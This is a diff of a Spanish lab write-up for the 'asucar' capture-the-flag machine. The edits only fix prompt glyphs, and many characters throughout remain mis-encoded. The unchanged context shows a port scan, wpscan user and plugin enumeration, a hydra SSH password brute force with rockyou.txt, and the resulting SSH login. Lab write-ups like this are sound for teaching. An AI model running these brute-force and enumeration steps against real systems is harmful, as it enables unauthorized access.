@@ -12,11 +12,11 @@ Fecha: 2026-02-12
 Lo primero que realizaremos sera un escaneo para identificar puertos y servicios abiertos:
 
 ```bash
-¯é░ settarget 172.17.0.2
+é settarget 172.17.0.2
 TARGET establecido: 172.17.0.2
 
-¯é░ gomap -s $TARGET
-­ƒÄ» Scanning 172.17.0.2 (997 ports)
+é gomap -s $TARGET
+­ Scanning 172.17.0.2 (997 ports)
 
  PORT    STATE  SERVICE      VERSION
 22 open ssh SSH-2.0 - OpenSSH 9.2p1
@@ -38,9 +38,9 @@ Nos encontramos con la pagina mal maquetada y sin im├ígenes, por consiguiente
 Efectivamente necesitamos indicar en nuestro **/etc/hosts** el dominio de esta web
 
 ```bash
-¯é░ sudo nano /etc/hosts
+é sudo nano /etc/hosts
 
-¯é░ cat /etc/hosts                             
+é cat /etc/hosts                             
 ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔö¼ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
        Ôöé File: /etc/hosts
 ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔö╝ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
@@ -65,7 +65,7 @@ Al navegar por la web no encontramos ning├║n dato ├║til que nos pueda se
 Ahora usaremos una herramienta para el reconocimiento de usuarios y plugins para ver si encontramos algo interesante.
 
 ```bash
-¯é░ wpscan --url http://asucar.dl -e u,p
+é wpscan --url http://asucar.dl -e u,p
 ```
 
 Con el **-e** indicamos que queremos realizar un enumeraci├│n de *usuarios* y *plugins* obteniendo el siguiente resultado:
@@ -211,7 +211,7 @@ De esta manera podremos ver todos los usuarios del sistema.
 En este listado encontramos un usuario llamado ***curiosito*** el cual podremos usar desde **ssh** para intentar el acceso mediante *hydra*.
 
 ```bash
-¯é░ hydra -l curiosito -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 5 ssh
+é hydra -l curiosito -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 5 ssh
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-11 17:05:02
@@ -225,7 +225,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-11 17:05:
 Ya hemos obtenido un usuario para una conexi├│n por **ssh** ahora nos conectaremos y empezaremos la escalada de privilegios.
 
 ```bash
-¯é░ ssh curiosito@$TARGET      
+é ssh curiosito@$TARGET      
 The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
 ED25519 key fingerprint is: SHA256:uxPuaJueTWTbzOOOgHR9jKEuKfQzpWt1rU8JihuRr4o
 This key is not known by any other names.
@@ -320,3 +320,4 @@ Posteriormente, una **configuraci├│n insegura de sudo**, permitiendo ejecuta
 ---
 Si te gusto puedes invitarme a un cafe.
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
+
